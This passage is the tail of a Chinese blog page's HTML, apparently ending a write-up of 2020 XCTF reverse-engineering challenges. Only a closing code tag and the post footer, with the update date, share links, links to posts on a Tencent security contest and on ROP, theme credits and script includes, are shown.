</span><span class="s2">&#34;&#34;&#34;</span>    
</code></pre></td></tr></table>
</div>
</div></div><div class="post-footer" id="post-footer">
    <div class="post-info">
        <div class="post-info-line">
            <div class="post-info-mod">
                <span>更新于 2020-04-05</span>
            </div>
            <div class="post-info-license"></div>
        </div>
        <div class="post-info-line">
            <div class="post-info-md"><span>
                            <a class="link-to-markdown" href="/2020xctf%E6%88%98%E5%BD%B9/index.md" target="_blank">阅读原始文档</a>
                        </span></div>
            <div class="post-info-share">
                <span><a href="javascript:void(0);" title="分享到 Twitter" data-sharer="twitter" data-url="https://linkleyping.top/2020xctf%E6%88%98%E5%BD%B9/" data-title="xctf战役_部分re题目"><i class="fab fa-twitter fa-fw"></i></a><a href="javascript:void(0);" title="分享到 Facebook" data-sharer="facebook" data-url="https://linkleyping.top/2020xctf%E6%88%98%E5%BD%B9/"><i class="fab fa-facebook-square fa-fw"></i></a><a href="javascript:void(0);" title="分享到 Hacker News" data-sharer="hackernews" data-url="https://linkleyping.top/2020xctf%E6%88%98%E5%BD%B9/" data-title="xctf战役_部分re题目"><i class="fab fa-hacker-news fa-fw"></i></a><a href="javascript:void(0);" title="分享到 Line" data-sharer="line" data-url="https://linkleyping.top/2020xctf%E6%88%98%E5%BD%B9/" data-title="xctf战役_部分re题目"><i data-svg-src="https://cdn.jsdelivr.net/npm/simple-icons@2.14.0/icons/line.svg"></i></a><a href="javascript:void(0);" title="分享到 微博" data-sharer="weibo" data-url="https://linkleyping.top/2020xctf%E6%88%98%E5%BD%B9/" data-title="xctf战役_部分re题目"><i class="fab fa-weibo fa-fw"></i></a></span>
            </div>
        </div>
    </div>

    <div class="post-info-more">
        <section class="post-tags"></section>
        <section>
            <span><a href="javascript:void(0);" onclick="window.history.back();">返回</a></span>&nbsp;|&nbsp;<span><a href="/">主页</a></span>
        </section>
    </div>

    <div class="post-nav"><a href="/%E6%AF%8F%E6%97%A5%E6%80%BB%E7%BB%93-%E7%AC%AC%E4%BA%94%E5%A4%A9-txwp/" class="prev" rel="prev" title="腾讯游戏安全竞赛2020"><i class="fas fa-angle-left fa-fw"></i>腾讯游戏安全竞赛2020</a>
            <a href="/rop%E5%AD%A6%E4%B9%A0/" class="next" rel="next" title="ROP学习">ROP学习<i class="fas fa-angle-right fa-fw"></i></a></div>
</div>
<div id="comments"></div></article></div>
            </main><footer class="footer">
        <div class="footer-container"><div class="footer-line">由 <a href="https://gohugo.io/" target="_blank" rel="noopener noreffer" title="Hugo 0.80.0">Hugo</a> 强力驱动 | 主题 - <a href="https://github.com/dillonzq/LoveIt" target="_blank" rel="noopener noreffer" title="LoveIt 0.2.10"><i class="far fa-kiss-wink-heart fa-fw"></i> LoveIt</a>
                </div>
                <script src="https://cdn.jsdelivr.net/npm/jquery@3.5.1/dist/jquery.min.js"></script>
                <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css" />
                <script src="https://cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js"></script>
            

            <div class="footer-line"><i class="far fa-copyright fa-fw"></i><span itemprop="copyrightYear">2019 - 2022</span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div>
        </div>
    </footer></div>

        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="回到顶部">
                <i class="fas fa-arrow-up fa-fw"></i>
            </a><a href="#" id="view-comments" class="fixed-button" title="查看评论">
                <i class="fas fa-comment fa-fw"></i>
            </a>
        </div><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/smooth-scroll@16.1.3/dist/smooth-scroll.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/autocomplete.js@0.37.1/dist/autocomplete.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/algoliasearch@4.2.0/dist/algoliasearch-lite.umd.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lazysizes@5.2.2/lazysizes.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/clipboard@2.0.6/dist/clipboard.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/sharer.js@0.4.0/sharer.min.js"></script><script type="text/javascript">window.config={"code":{"copyTitle":"复制到剪贴板","maxShownLines":100},"comment":{},"search":{"algoliaAppID":"RFO4PNFHT1","algoliaIndex":"blog","algoliaSearchKey":"d13f32411166c6212551ffa815910ba5","highlightTag":"em","maxResultLength":10,"noResultsFound":"没有找到结果","snippetLength":50,"type":"algolia"}};</script><script type="text/javascript" src="/js/theme.min.js"></script></body>
</html>
